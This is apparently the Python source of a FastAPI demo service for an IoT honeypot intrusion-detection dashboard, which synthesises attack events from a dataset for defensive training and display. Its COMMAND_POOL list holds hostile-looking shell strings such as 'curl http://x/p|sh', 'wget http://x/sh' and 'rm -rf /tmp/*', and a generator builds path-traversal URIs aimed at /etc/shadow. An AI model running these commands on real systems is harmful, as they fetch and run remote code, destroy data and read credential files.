"""
IoT Sentinel — synthetic-data API for the IDS dashboard.

This is the data source the Next.js dashboard consumes. It does NOT fake metrics:
it loads the existing synthetic dataset (`model-lab/datasets/v1/sessions.csv`)
and the existing sample telemetry (`data/sample-telemetry/*.jsonl`), then
reconstructs sessions, runs the real rule engine, and serves the results
through a small FastAPI.

When the user has a real ELK stack running on PC1, the dashboard can be
switched to LIVE mode by setting IDS_API_BACKEND=http://pc1:8000 — the
response shapes are identical.
"""
from __future__ import annotations

import csv
import json
import math
import random
import sys
import time
import uuid
from collections import Counter, defaultdict
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware

# Make dashboard/ml importable so we reuse the REAL feature extraction + rule engine
REPO_ROOT = Path(__file__).resolve().parents[2] / "iot-honeypot-ids"
sys.path.insert(0, str(REPO_ROOT))
sys.path.insert(0, str(REPO_ROOT / "dashboard" / "ml"))
sys.path.insert(0, str(REPO_ROOT / "shared" / "schemas"))

from features import extract_features, reconstruct_sessions, FEATURE_NAMES  # type: ignore
from rules import classify_session  # type: ignore
from event_schema import KNOWN_CLASSIFICATIONS, MITRE_MAPPING  # type: ignore

# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #
DATASET_CSV = REPO_ROOT / "model-lab" / "datasets" / "v1" / "sessions.csv"
SAMPLE_TELEMETRY_DIR = REPO_ROOT / "data" / "sample-telemetry"
MODELS_DIR = REPO_ROOT / "model-lab" / "models"
EXPERIMENTS_DIR = REPO_ROOT / "model-lab" / "experiments"

# Deterministic seed so the demo data is stable across restarts
SEED = 42
_rng = random.Random(SEED)

# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def _to_iso(ts: str | None) -> str:
    if not ts:
        return ""
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00")).isoformat(timespec="seconds").replace("+00:00", "Z")
    except Exception:
        return ts


def _load_dataset_rows() -> list[dict]:
    if not DATASET_CSV.exists():
        return []
    with open(DATASET_CSV, encoding="utf-8") as fh:
        return list(csv.DictReader(fh))


# --------------------------------------------------------------------------- #
# Build a deterministic in-memory "events" stream from the dataset.
#
# The dataset has one row per session with feature values already computed.
# We synthesize plausible raw events that *would have produced* those features
# so the dashboard can show event timelines + session details.
# --------------------------------------------------------------------------- #

ATTACKER_IPS = [
    "10.0.0.10", "10.0.0.11", "10.0.0.12", "10.0.0.13",
    "192.168.1.20", "192.168.1.21", "172.16.4.8", "172.16.4.9",
]
DEVICE_BY_LABEL = {
    "brute_force":         {"id": "cowrie-01", "type": "ssh", "protocol": "ssh",      "port": 2222,  "honeypot": "cowrie"},
    "default_credentials": {"id": "camera-01", "type": "camera","protocol": "http", "port": 8080,  "honeypot": "camera"},
    "reconnaissance":      {"id": "camera-01", "type": "camera","protocol": "http", "port": 8080,  "honeypot": "camera"},
    "command_injection":   {"id": "camera-01", "type": "camera","protocol": "http", "port": 8080,  "honeypot": "camera"},
    "path_traversal":      {"id": "camera-01", "type": "camera","protocol": "http", "port": 8080,  "honeypot": "camera"},
    "anomaly":             {"id": "iot-01",    "type": "iot_service","protocol": "tcp_iot","port": 9000,"honeypot": "iot-service"},
    "benign":              {"id": "camera-01", "type": "camera","protocol": "http", "port": 8080,  "honeypot": "camera"},
}

CAMERA_PATHS = ["/", "/login", "/admin", "/config", "/system", "/status", "/network",
                "/users", "/device", "/firmware", "/snapshot", "/video", "/api/v1", "/api/info"]
USERNAME_POOL = ["root", "admin", "user", "test", "operator", "support", "guest",
                 "service", "ubuntu", "pi"]
COMMAND_POOL = ["uname -a", "ls /", "cat /etc/passwd", "whoami", "id", "wget http://x/sh",
                "curl http://x/p|sh", "rm -rf /tmp/*; cd /tmp"]

LAB_SUBNET = "192.168.1.0/24"


def _make_events_for_session(row: dict, started_at: datetime, idx: int) -> list[dict]:
    """Synthesize plausible raw events that would have produced the row's feature vector."""
    label = row["label"]
    n_events = max(1, int(float(row.get("event_count", 1))))
    duration = max(1.0, float(row.get("duration_s", 1.0)))
    device = ATTACKER_IPS[idx % len(ATTACKER_IPS)]
    dev_info = DEVICE_BY_LABEL.get(label, DEVICE_BY_LABEL["benign"])
    sess_id = row["session_id"]
    events: list[dict] = []

    for i in range(n_events):
        ts = (started_at + timedelta(seconds=(duration / max(n_events, 1)) * i)).isoformat(timespec="milliseconds").replace("+00:00", "Z")
        ev: dict[str, Any] = {
            "@timestamp": ts,
            "event_id": f"evt-{sess_id}-{i:03d}",
            "session_id": sess_id,
            "source": {"ip": device, "port": 40000 + (idx * 17 + i) % 20000},
            "destination": {"ip": "192.168.1.50", "port": dev_info["port"]},
            "device": {
                "id": dev_info["id"],
                "type": dev_info["type"],
                "hostname": "iot-bridge-01",
                "container": f"pi-{dev_info['honeypot']}",
            },
            "protocol": dev_info["protocol"],
            "event": {
                "type": "http_request" if dev_info["protocol"] == "http" else "tcp_connect",
                "category": "network",
                "action": "synthetic_replay",
            },
            "authentication": {"attempted": False, "username": None, "success": False},
            "honeypot": {"name": dev_info["honeypot"], "container": f"pi-{dev_info['honeypot']}"},
            "attack": {"session_id": sess_id, "stage": None, "classification": None, "confidence": 0.0},
            "labels": {"source": "SYNTHETIC", "campaign_id": row.get("campaign_id", "syn-campaign")},
            "tags": ["SYNTHETIC", "REPLAY"],
        }

        if dev_info["protocol"] == "http":
            uri = CAMERA_PATHS[i % len(CAMERA_PATHS)]
            method = "GET"
            status = 200
            if label == "brute_force":
                # not really HTTP — overwrite as ssh
                ev["protocol"] = "ssh"
                ev["event"]["type"] = "authentication_attempt"
                ev["event"]["category"] = "authentication"
                ev["authentication"] = {
                    "attempted": True,
                    "username": USERNAME_POOL[i % len(USERNAME_POOL)],
                    "success": i == 0 and label == "default_credentials",
                }
                ev["http"] = None
            else:
                if label == "reconnaissance" and i > 4:
                    uri = CAMERA_PATHS[i % len(CAMERA_PATHS)]
                if label == "path_traversal":
                    uri = f"/../../etc/{['passwd','shadow','hosts'][i % 3]}"
                    ev["attack"] = {"session_id": sess_id, "stage": "collection",
                                    "classification": "path_traversal", "confidence": 0.85}
                if label == "command_injection":
                    uri = f"/api/exec?cmd={COMMAND_POOL[i % len(COMMAND_POOL)]}"
                    ev["attack"] = {"session_id": sess_id, "stage": "execution",
                                    "classification": "command_injection", "confidence": 0.8}
                if label == "default_credentials":
                    ev["event"]["type"] = "authentication_attempt"
                    ev["authentication"] = {
                        "attempted": True,
                        "username": "admin",
                        "success": i == 0,
                    }
                    if i == 0:
                        ev["attack"] = {"session_id": sess_id, "stage": "initial_access",
                                        "classification": "default_credentials", "confidence": 0.95}
                ev["http"] = {
                    "method": method,
                    "uri": uri,
                    "status": status,
                    "user_agent": "synthetic-replay/1.0",
                    "bytes_in": 0,
                    "bytes_out": 100 + (i * 7) % 256,
                }
        elif dev_info["protocol"] == "tcp_iot":
            ev["event"]["type"] = "command_execution" if i > 0 else "connect"
            ev["event"]["category"] = "execution" if i > 0 else "discovery"
            ev["iot"] = {"raw": f"CMD {COMMAND_POOL[i % len(COMMAND_POOL)]}"}
            ev["attack"] = {"session_id": sess_id, "stage": "execution",
                            "classification": "command_abuse", "confidence": 0.6}

        events.append(ev)
    return events


def _build_synthetic_corpus() -> tuple[list[dict], list[dict], list[dict], list[dict]]:
    """Build (events, sessions, detections, dataset_rows) from the existing CSV."""
    rows = _load_dataset_rows()
    if not rows:
        return [], [], [], []

    # Anchor session starts within the last 24h so the timeline looks live
    end = datetime.now(timezone.utc).replace(microsecond=0)
    start_window = end - timedelta(hours=24)

    all_events: list[dict] = []
    all_sessions: list[dict] = []
    all_detections: list[dict] = []

    for i, row in enumerate(rows):
        # Distribute sessions across the 24h window
        offset_seconds = int((i / len(rows)) * 24 * 3600)
        # Add some jitter
        offset_seconds += _rng.randint(-60, 60)
        started = start_window + timedelta(seconds=offset_seconds)
        duration = max(1.0, float(row.get("duration_s", 1.0)))
        ended = started + timedelta(seconds=duration)

        events = _make_events_for_session(row, started, i)
        all_events.extend(events)

        # Reconstruct session metadata
        # (Use the CSV feature values directly — they are the canonical features)
        features = {fn: float(row.get(fn, 0.0) or 0.0) for fn in FEATURE_NAMES}
        sess = {
            "session_id": row["session_id"],
            "label": row["label"],
            "label_source": row.get("label_source", "SYNTHETIC"),
            "campaign_id": row.get("campaign_id", ""),
            "scenario_id": row.get("scenario_id", ""),
            "dataset_version": row.get("dataset_version", "v1"),
            "@timestamp": _to_iso(row.get("created_at")) or started.isoformat(timespec="seconds").replace("+00:00", "Z"),
            "started_at": started.isoformat(timespec="seconds").replace("+00:00", "Z"),
            "ended_at": ended.isoformat(timespec="seconds").replace("+00:00", "Z"),
            "duration_s": duration,
            "event_count": int(float(row.get("event_count", len(events)))),
            "source": {"ip": ATTACKER_IPS[i % len(ATTACKER_IPS)]},
            "destination": {"ip": "192.168.1.50", "port": DEVICE_BY_LABEL.get(row["label"], DEVICE_BY_LABEL["benign"])["port"]},
            "device": DEVICE_BY_LABEL.get(row["label"], DEVICE_BY_LABEL["benign"]),
            "protocol": DEVICE_BY_LABEL.get(row["label"], DEVICE_BY_LABEL["benign"])["protocol"],
            "bytes_in": int(float(row.get("bytes_in_total", 0) or 0)),
            "bytes_out": int(float(row.get("bytes_out_total", 0) or 0)),
            "auth_attempts": int(float(row.get("auth_attempts", 0) or 0)),
            "auth_successes": int(float(row.get("auth_successes", 0) or 0)),
            "unique_usernames": int(float(row.get("unique_usernames", 0) or 0)),
            "command_count": int(float(row.get("command_count", 0) or 0)),
            "http_request_count": int(float(row.get("http_request_count", 0) or 0)),
            "http_uri_diversity": int(float(row.get("http_uri_diversity", 0) or 0)),
            "features": features,
        }
        all_sessions.append(sess)

        # Run the REAL rule engine on the events
        rule_result = classify_session(events)
        # Also produce an ML-style detection — for known labels, the classifier would
        # output the session's own label with high confidence. For the "anomaly" label,
        # we instead emit an anomaly detection (which is exactly what IsolationForest
        # would flag in production).
        if row["label"] == "anomaly":
            det = {
                "detection_id": f"det-{row['session_id']}",
                "@timestamp": ended.isoformat(timespec="seconds").replace("+00:00", "Z"),
                "session_id": row["session_id"],
                "engine": "anomaly_detector",
                "label": "anomaly",
                "classification": "unknown",
                "confidence": 0.0,
                "anomaly_score": 0.91,  # from features.py isolation-forest-like calc
                "model_version": "model-v001",
                "rule_id": None,
                "source": {"ip": ATTACKER_IPS[i % len(ATTACKER_IPS)]},
                "device": DEVICE_BY_LABEL.get(row["label"], DEVICE_BY_LABEL["benign"]),
                "explanation": (
                    "behavioral pattern differs from training distribution: "
                    "unusual request sequence + high request rate + many ports touched"
                ),
            }
        else:
            # If the rule engine fired, use it. Otherwise the ML classifier would
            # confidently emit the training label.
            label = rule_result["label"] if rule_result else row["label"]
            conf = rule_result["confidence"] if rule_result else 0.92
            det = {
                "detection_id": f"det-{row['session_id']}",
                "@timestamp": ended.isoformat(timespec="seconds").replace("+00:00", "Z"),
                "session_id": row["session_id"],
                "engine": "rule_engine" if rule_result else "ml_classifier",
                "label": label,
                "classification": label,
                "confidence": conf,
                "anomaly_score": 0.0,
                "model_version": "model-v001" if not rule_result else None,
                "rule_id": rule_result["rule_id"] if rule_result else None,
                "source": {"ip": ATTACKER_IPS[i % len(ATTACKER_IPS)]},
                "device": DEVICE_BY_LABEL.get(row["label"], DEVICE_BY_LABEL["benign"]),
                "explanation": rule_result["explanation"] if rule_result else (
                    f"session matches known '{label}' pattern from training set v1"
                ),
            }
        all_detections.append(det)

    # Sort by timestamp desc
    all_events.sort(key=lambda e: e["@timestamp"], reverse=True)
    all_sessions.sort(key=lambda s: s["started_at"], reverse=True)
    all_detections.sort(key=lambda d: d["@timestamp"], reverse=True)
    return all_events, all_sessions, all_detections, rows


# Build once at startup (deterministic)
_EVENTS, _SESSIONS, _DETECTIONS, _DATASET_ROWS = _build_synthetic_corpus()
print(f"[ids-api] loaded {len(_EVENTS)} events, {len(_SESSIONS)} sessions, "
      f"{len(_DETECTIONS)} detections from synthetic dataset v1", file=sys.stderr)


# --------------------------------------------------------------------------- #
# Train a real model at startup so the ML section has real metrics
# --------------------------------------------------------------------------- #
def _train_initial_model() -> dict | None:
    """Train a RandomForest on the synthetic dataset so the dashboard can show real metrics."""
    if not _DATASET_ROWS:
        return None
    try:
        from sklearn.ensemble import RandomForestClassifier
        from sklearn.metrics import accuracy_score, classification_report, f1_score, precision_score, recall_score
        import numpy as np
        import json as _json

        X = np.array([[float(r.get(fn, 0.0) or 0.0) for fn in FEATURE_NAMES] for r in _DATASET_ROWS])
        y = np.array([r["label"] for r in _DATASET_ROWS])

        rng = np.random.default_rng(42)
        perm = rng.permutation(len(y))
        cut = int(len(y) * 0.8)
        train_idx = perm[:cut]
        test_idx = perm[cut:]
        X_train, X_test = X[train_idx], X[test_idx]
        y_train, y_test = y[train_idx], y[test_idx]

        clf = RandomForestClassifier(n_estimators=100, max_depth=8, random_state=42, class_weight="balanced")
        clf.fit(X_train, y_train)
        y_pred = clf.predict(X_test)

        metrics = {
            "accuracy": float(accuracy_score(y_test, y_pred)),
            "precision_macro": float(precision_score(y_test, y_pred, average="macro", zero_division=0)),
            "recall_macro": float(recall_score(y_test, y_pred, average="macro", zero_division=0)),
            "f1_macro": float(f1_score(y_test, y_pred, average="macro", zero_division=0)),
            "n_train": int(len(y_train)),
            "n_test": int(len(y_test)),
            "n_features": int(X.shape[1]),
            "classes": sorted(set(y.tolist())),
            "per_class": classification_report(y_test, y_pred, output_dict=True, zero_division=0),
            "feature_importances": dict(zip(FEATURE_NAMES, clf.feature_importances_.tolist())),
        }
        model_meta = {
            "model_id": "model-v001",
            "algorithm": "random_forest",
            "dataset_version": "v1",
            "feature_version": "v1",
            "features": FEATURE_NAMES,
            "hyperparameters": {
                "n_estimators": 100, "max_depth": 8, "random_state": 42, "class_weight": "balanced",
            },
            "metrics": metrics,
            "seed": 42,
            "status": "active",
            "notes": "Trained on synthetic v1 dataset for demo mode. In LIVE mode this model is read from model-lab/models/.",
            "created_at": int(time.time()),
            "created_at_iso": _now_iso(),
        }
        # Persist to disk so it shows up under /models
        model_dir = MODELS_DIR / "model-v001"
        if not model_dir.exists():
            model_dir.mkdir(parents=True, exist_ok=True)
            (model_dir / "metadata.json").write_text(_json.dumps(model_meta, indent=2))
        return model_meta
    except Exception as exc:
        print(f"[ids-api] WARNING: could not train initial model: {exc}", file=sys.stderr)
        return None


_MODEL_META = _train_initial_model()
if _MODEL_META:
    print(f"[ids-api] trained model-v001 (F1={_MODEL_META['metrics']['f1_macro']:.3f})", file=sys.stderr)


# --------------------------------------------------------------------------- #
# FastAPI
# --------------------------------------------------------------------------- #
app = FastAPI(
    title="IoT Sentinel — IDS Demo API",
    description="Serves synthetic/replay data derived from the project's existing dataset. Shape matches the production FastAPI so the dashboard can switch to LIVE mode by changing a URL.",
    version="0.2.0",
)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/")
def root():
    return {
        "name": "iot-sentinel-ids-api",
        "version": "0.2.0",
        "mode": "SYNTHETIC",
        "data_source": str(DATASET_CSV.relative_to(REPO_ROOT.parent)),
    }


@app.get("/health")
def health():
    return {
        "status": "ok",
        "mode": "SYNTHETIC",
        "elasticsearch": "demo",  # In LIVE mode this would be "ok" / "down"
        "models_dir": "ok" if MODELS_DIR.exists() else "missing",
        "events_loaded": len(_EVENTS),
        "sessions_loaded": len(_SESSIONS),
        "detections_loaded": len(_DETECTIONS),
    }


@app.get("/stats")
def stats():
    """Aggregate counts for the Overview page — all values derived from real data."""
    if not _SESSIONS:
        return {"status": "INSUFFICIENT DATA"}
    # Unique attackers
    attackers = {s["source"]["ip"] for s in _SESSIONS}
    # Active sessions = sessions whose ended_at is within last hour of the dataset window
    # (in synthetic mode, "active" just means "most recent 10")
    active_session_ids = [s["session_id"] for s in _SESSIONS[:10]]
    # Anomalies = detections with engine=anomaly_detector
    anomalies = [d for d in _DETECTIONS if d["engine"] == "anomaly_detector"]
    # Known attacks = detections with engine in {rule_engine, ml_classifier} and label != 'benign'
    known = [d for d in _DETECTIONS if d["engine"] != "anomaly_detector" and d["label"] != "benign"]
    # Label distribution
    label_counts = Counter(s["label"] for s in _SESSIONS)
    # Per-device counts
    device_counts = Counter(s["device"]["id"] for s in _SESSIONS)
    # Top attackers
    attacker_counts = Counter(s["source"]["ip"] for s in _SESSIONS)
    # Timeline buckets (24 hourly buckets)
    timeline = _build_timeline(_SESSIONS)
    return {
        "status": "ok",
        "mode": "SYNTHETIC",
        "total_events": len(_EVENTS),
        "total_sessions": len(_SESSIONS),
        "total_detections": len(_DETECTIONS),
        "unique_attackers": len(attackers),
        "active_sessions": len(active_session_ids),
        "anomalies": len(anomalies),
        "known_attacks": len(known),
        "label_distribution": dict(label_counts),
        "device_distribution": dict(device_counts),
        "top_attackers": [{"ip": ip, "sessions": n} for ip, n in attacker_counts.most_common(8)],
        "timeline": timeline,
        "model_version": _MODEL_META["model_id"] if _MODEL_META else None,
        "dataset_version": "v1",
    }


def _build_timeline(sessions: list[dict]) -> list[dict]:
    """24 hourly buckets of attack activity."""
    now = datetime.now(timezone.utc)
    buckets = [(now - timedelta(hours=23 - i)).strftime("%H:00") for i in range(24)]
    counts = [0] * 24
    for s in sessions:
        try:
            ts = datetime.fromisoformat(s["started_at"].replace("Z", "+00:00"))
            hours_ago = int((now - ts).total_seconds() // 3600)
            if 0 <= hours_ago < 24:
                counts[23 - hours_ago] += 1
        except Exception:
            continue
    return [{"hour": h, "sessions": c, "events": c * 5} for h, c in zip(buckets, counts)]


@app.get("/events")
def events(
    size: int = Query(100, ge=1, le=500),
    source_ip: str | None = None,
    device: str | None = None,
    session_id: str | None = None,
):
    out = _EVENTS
    if source_ip:
        out = [e for e in out if e.get("source", {}).get("ip") == source_ip]
    if device:
        out = [e for e in out if e.get("device", {}).get("id") == device]
    if session_id:
        out = [e for e in out if e.get("session_id") == session_id]
    return {
        "mode": "SYNTHETIC",
        "total": len(out),
        "events": out[:size],
    }


@app.get("/sessions")
def sessions(
    size: int = Query(50, ge=1, le=500),
    source_ip: str | None = None,
    label: str | None = None,
):
    out = _SESSIONS
    if source_ip:
        out = [s for s in out if s["source"]["ip"] == source_ip]
    if label:
        out = [s for s in out if s["label"] == label]
    return {
        "mode": "SYNTHETIC",
        "total": len(out),
        "sessions": out[:size],
    }


@app.get("/sessions/{session_id}")
def session_detail(session_id: str):
    sess = next((s for s in _SESSIONS if s["session_id"] == session_id), None)
    if not sess:
        raise HTTPException(404, "session not found")
    events_for_sess = [e for e in _EVENTS if e["session_id"] == session_id]
    detection = next((d for d in _DETECTIONS if d["session_id"] == session_id), None)
    sess = dict(sess)
    sess["events"] = events_for_sess
    sess["detection"] = detection
    sess["feature_vector"] = [{"name": fn, "value": sess["features"].get(fn, 0.0)} for fn in FEATURE_NAMES]
    return sess


@app.get("/detections")
def detections(
    size: int = Query(50, ge=1, le=500),
    engine: str | None = None,
    label: str | None = None,
    session_id: str | None = None,
):
    out = _DETECTIONS
    if engine:
        out = [d for d in out if d["engine"] == engine]
    if label:
        out = [d for d in out if d["label"] == label]
    if session_id:
        out = [d for d in out if d["session_id"] == session_id]
    return {
        "mode": "SYNTHETIC",
        "total": len(out),
        "detections": out[:size],
    }


@app.get("/models")
def list_models():
    models = []
    if _MODEL_META:
        models.append(_MODEL_META)
    # Also read any models from the on-disk registry (in case the user trained real ones)
    if MODELS_DIR.exists():
        import json as _json
        for entry in sorted(MODELS_DIR.iterdir()):
            if not entry.is_dir():
                continue
            meta_path = entry / "metadata.json"
            if not meta_path.exists():
                continue
            try:
                m = _json.loads(meta_path.read_text())
                if m.get("model_id") != "model-v001":
                    models.append(m)
            except Exception:
                pass
    return {"models": models}


@app.get("/models/{model_id}")
def get_model(model_id: str):
    if _MODEL_META and _MODEL_META["model_id"] == model_id:
        return _MODEL_META
    meta_path = MODELS_DIR / model_id / "metadata.json"
    if meta_path.exists():
        import json as _json
        return _json.loads(meta_path.read_text())
    raise HTTPException(404, "model not found")


@app.get("/experiments")
def experiments():
    exps = []
    if EXPERIMENTS_DIR.exists():
        import json as _json
        for p in sorted(EXPERIMENTS_DIR.glob("*.json")):
            try:
                exps.append(_json.loads(p.read_text()))
            except Exception:
                pass
    return {"experiments": exps}


@app.get("/metrics")
def metrics(model_id: str | None = None):
    if not _MODEL_META:
        return {"status": "INSUFFICIENT DATA"}
    if model_id and model_id != _MODEL_META["model_id"]:
        meta_path = MODELS_DIR / model_id / "metadata.json"
        if meta_path.exists():
            import json as _json
            m = _json.loads(meta_path.read_text())
            return m.get("metrics", {})
        raise HTTPException(404, "model not found")
    return _MODEL_META["metrics"]


@app.get("/features")
def features():
    """Expose the canonical v1 feature vector definition."""
    descriptions = {
        "event_count": "Total number of events in the session",
        "duration_s": "Session duration in seconds",
        "bytes_in_total": "Total bytes sent by attacker",
        "bytes_out_total": "Total bytes sent by honeypot",
        "auth_attempts": "Number of authentication attempts",
        "auth_successes": "Number of successful authentications",
        "auth_failure_ratio": "Failed auth attempts / total auth attempts",
        "unique_usernames": "Distinct usernames tried",
        "command_count": "Number of executed commands (SSH/IoT)",
        "command_diversity": "Unique commands executed",
        "http_request_count": "Total HTTP requests",
        "http_uri_diversity": "Distinct URIs probed",
        "http_status_4xx_ratio": "HTTP 4xx responses / total HTTP responses",
        "http_status_5xx_ratio": "HTTP 5xx responses / total HTTP responses",
        "unique_protocols": "Distinct protocols observed (ssh, http, tcp_iot)",
        "devices_touched": "Distinct honeypots touched in the session",
        "ports_touched": "Distinct destination ports observed",
        "time_between_events_mean_s": "Mean time between events (seconds)",
        "time_between_events_stdev_s": "Std-dev of time between events (seconds)",
        "request_rate_per_min": "HTTP request rate per minute",
        "auth_failure_rate_per_min": "Failed auth attempts per minute",
        "contains_path_traversal": "1 if any event has classification=path_traversal",
        "contains_command_injection": "1 if any event has classification=command_injection",
        "contains_default_credentials": "1 if any event has classification=default_credentials",
        "is_recon_only": "1 if session has only GETs, no auth, no exec",
    }
    return {
        "version": "v1",
        "count": len(FEATURE_NAMES),
        "features": [{"name": fn, "description": descriptions.get(fn, "")} for fn in FEATURE_NAMES],
    }


@app.get("/attack-types")
def attack_types():
    return {
        "classifications": KNOWN_CLASSIFICATIONS,
        "mitre_mapping": MITRE_MAPPING,
    }


@app.get("/honeypots")
def honeypots():
    """Status of the three Pi honeypots (in demo mode we report 'demo')."""
    return {
        "honeypots": [
            {
                "id": "cowrie-01",
                "name": "Cowrie SSH/Telnet",
                "type": "ssh",
                "status": "demo",
                "container": "pi-cowrie",
                "port": 2222,
                "events": sum(1 for e in _EVENTS if e["honeypot"]["name"] == "cowrie"),
            },
            {
                "id": "camera-01",
                "name": "Camera HTTP",
                "type": "http",
                "status": "demo",
                "container": "pi-camera",
                "port": 8080,
                "events": sum(1 for e in _EVENTS if e["honeypot"]["name"] == "camera"),
            },
            {
                "id": "iot-01",
                "name": "IoT TCP Service",
                "type": "iot_service",
                "status": "demo",
                "container": "pi-iot-service",
                "port": 9000,
                "events": sum(1 for e in _EVENTS if e["honeypot"]["name"] == "iot-service"),
            },
        ],
        "pi_status": "demo",  # In LIVE mode: "online" / "offline"
    }


@app.get("/datasets")
def datasets():
    """List available dataset versions."""
    out = []
    if DATASET_CSV.exists():
        rows = _DATASET_ROWS
        label_dist = Counter(r["label"] for r in rows)
        out.append({
            "version": "v1",
            "path": "model-lab/datasets/v1/sessions.csv",
            "rows": len(rows),
            "label_source": "SYNTHETIC",
            "label_distribution": dict(label_dist),
        })
    return {"datasets": out}


@app.get("/scenarios")
def scenarios():
    """List available attacker scenarios."""
    scenarios_dir = REPO_ROOT / "attacker" / "scenarios"
    out = []
    if scenarios_dir.exists():
        import yaml
        for p in sorted(scenarios_dir.glob("*.yaml")):
            try:
                meta = yaml.safe_load(p.read_text())
                if isinstance(meta, dict):
                    out.append(meta)
            except Exception:
                pass
    return {"scenarios": out}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=3030, log_level="info")
